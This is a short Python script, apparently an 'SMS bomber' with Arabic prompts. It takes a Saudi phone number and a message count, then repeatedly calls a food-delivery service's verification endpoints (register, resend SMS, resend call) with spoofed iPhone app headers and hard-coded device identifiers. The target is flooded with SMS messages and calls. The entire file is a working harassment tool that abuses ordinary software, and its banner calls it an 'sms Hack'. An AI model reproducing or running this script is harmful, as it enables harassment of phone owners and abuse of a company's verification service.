import os, sys, json, requests, time

class Bala:
	def __init__(self):
		self.u="https://hungerstation.com/api/v2/verification/register"
		self.a="https://hungerstation.com/api/v2/verification/resend_sms"
		self.h="https://hungerstation.com/api/v2/verification/resend_call"
		self.unum()

	def unum(self):
		nom=input(f"الرقم بدون اصفر :  ")
		jum=int(input("كم تريد ارسال له رساله مزعجه : "))
		for i in range(jum):
			res=self.send(nom)
			if 'message' in res:
				print(f"{i+1}. تم الارسال")
			else:
				print(f"{i+1}. Failed\n")
			time.sleep(1)

	def send(self,nom):
		ata={"country":"1","device_type":"2","device_uid":"9ACA8EFE-3D05-4011-B826-6DC1911111F7","mobile":"+966"+nom,"notification_token":"0093579A228AD7EC400827409F480EAA7DD9676EB69696AED5A5C51A91B52253"}
		head={
		'Host':'hungerstation.com',
        'DEVICE-UID': '9ACA8EFE-3D05-4011-B826-6DC1911111F7',
        'Accept': '*/*',
        'App-Version': '371',
        'Authorization':'' ,
        'Accept-Language': 'ar',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        'Content-Length': '168',
        'User-Agent': 'HungerStation/371 iPhone/9,3 iOS/14.4.1 CFNetwork/1220.1 Darwin/20.3.0',
        'Connection': 'keep-alive',
        'Cookie': '__cfduid=de1ec8ec5331ca9e93f1603e2af607a561618990673',}
        
		req=requests.post(self.u,data=ata,headers=head)
		req=requests.post(self.a,data=ata,headers=head)
		req=requests.post(self.h,data=ata,headers=head)
		return req.text

try:
	os.system('clear')
	print("""\033[1;37m
	# SmFlo #
	    ~ sms Hack Developer 0xfff0800
	    (Greetings to Hungerstation)
	""")
	Bala()

	while True:
		pil=input("هل ترغب بالاستمرار (y/n)?")
		if pil.lower() == "y":
			print()
			Bala()
		else:
			sys.exit("مع السلامه يامزعج ")
except Exception as Err:
	print(f"Err: {Err}")
